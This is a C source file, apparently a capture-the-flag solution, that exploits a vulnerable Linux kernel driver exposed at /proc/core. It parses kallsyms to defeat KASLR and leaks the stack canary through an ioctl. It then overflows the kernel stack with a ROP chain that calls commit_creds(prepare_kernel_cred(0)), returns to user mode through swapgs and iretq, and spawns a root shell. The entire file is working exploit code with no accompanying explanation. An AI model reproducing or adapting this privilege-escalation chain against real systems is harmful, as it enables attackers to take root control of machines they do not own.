#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/ioctl.h>

void spawn_shell()
{
	if(!getuid())
	{
		system("/bin/sh");
	}
	else
	{
		puts("[*]spawn shell error!");
	}
	exit(0);
}

size_t commit_creds = 0, prepare_kernel_cred = 0;
size_t raw_vmlinux_base = 0xFFFFFFFF81000000;
size_t vmlinux_base = 0;
size_t find_symbols()
{
	FILE* kallsyms_fd = fopen("/tmp/kallsyms", "r");
	/* FILE* kallsyms_fd = fopen("./test_kallsyms", "r"); */

	if(kallsyms_fd < 0)
	{
		puts("[*]open kallsyms error!");
		exit(0);
	}

	char buf[0x30] = {0};
	while(fgets(buf, 0x30, kallsyms_fd))
	{
		if(commit_creds & prepare_kernel_cred)
			return 0;

		if(strstr(buf, "commit_creds") && !commit_creds)
		{
			char hex[20] = {0};
			strncpy(hex, buf, 16);
			sscanf(hex, "%llx", &commit_creds);
			printf("commit_creds addr: %p\n", commit_creds);
			vmlinux_base = commit_creds - 0x9C8E0;
			printf("vmlinux_base addr: %p\n", vmlinux_base);
		}

		if(strstr(buf, "prepare_kernel_cred") && !prepare_kernel_cred)
		{
			char hex[20] = {0};
			strncpy(hex, buf, 16);
			sscanf(hex, "%llx", &prepare_kernel_cred);
			printf("prepare_kernel_cred addr: %p\n", prepare_kernel_cred);
			vmlinux_base = prepare_kernel_cred - 0x9CCE0;
		}
	}

	if(!(prepare_kernel_cred & commit_creds))
	{
		puts("[*]Error!");
		exit(0);
	}

}

size_t user_cs, user_ss, user_rflags, user_sp;
void save_status()
{
	__asm__("mov user_cs, cs;"
			"mov user_ss, ss;"
			"mov user_sp, rsp;"
			"pushf;"
			"pop user_rflags;"
			);
	puts("[*]status has been saved.");
}

void set_off(int fd, long long idx)
{
	printf("[*]set off to %ld\n", idx);
	ioctl(fd, 0x6677889C, idx);
}

void core_read(int fd, char *buf)
{
	puts("[*]read to buf.");
	ioctl(fd, 0x6677889B, buf);

}

void core_copy_func(int fd, long long size)
{
	printf("[*]copy from user with size: %ld\n", size);
	ioctl(fd, 0x6677889A, size);
}

int main()
{
	save_status();
	int fd = open("/proc/core", 2);
	if(fd < 0)
	{
		puts("[*]open /proc/core error!");
		exit(0);
	}
	
	find_symbols();
	ssize_t offset = vmlinux_base - raw_vmlinux_base;

	set_off(fd, 0x40);

	char buf[0x40] = {0};
	core_read(fd, buf);
	size_t canary = ((size_t *)buf)[0];
	printf("[+]canary: %p\n", canary);

	size_t rop[0x1000] = {0};

	int i;
	for(i = 0; i < 10; i++)
	{
		rop[i] = canary;
	}
	rop[i++] = 0xFFFFFFFF81000B2F + offset; // pop rdi; ret
	rop[i++] = 0;
	rop[i++] = prepare_kernel_cred;			// prepare_kernel_cred(0)

	rop[i++] = 0xFFFFFFFF810A0F49 + offset; // pop rdx; ret
	rop[i++] = 0xFFFFFFFF81021E53 + offset; // pop rcx; ret
	rop[i++] = 0xFFFFFFFF8101AA6A + offset; // mov rdi, rax; call rdx; 
	rop[i++] = commit_creds;
	
	rop[i++] = 0xFFFFFFFF81A012DA + offset; // swapgs; popfq; ret
	rop[i++] = 0;

	rop[i++] = 0xFFFFFFFF81050AC2 + offset; // iretq; ret; 

	rop[i++] = (size_t)spawn_shell;			// rip 
	
	rop[i++] = user_cs;						// cs
	rop[i++] = user_rflags;					// rflags
	rop[i++] = user_sp;						// rsp
	rop[i++] = user_ss;						// ss

	write(fd, rop, 0x800);
	core_copy_func(fd, 0xFFFFFFFFFFFF0000 | (0x100));

	return 0;
}
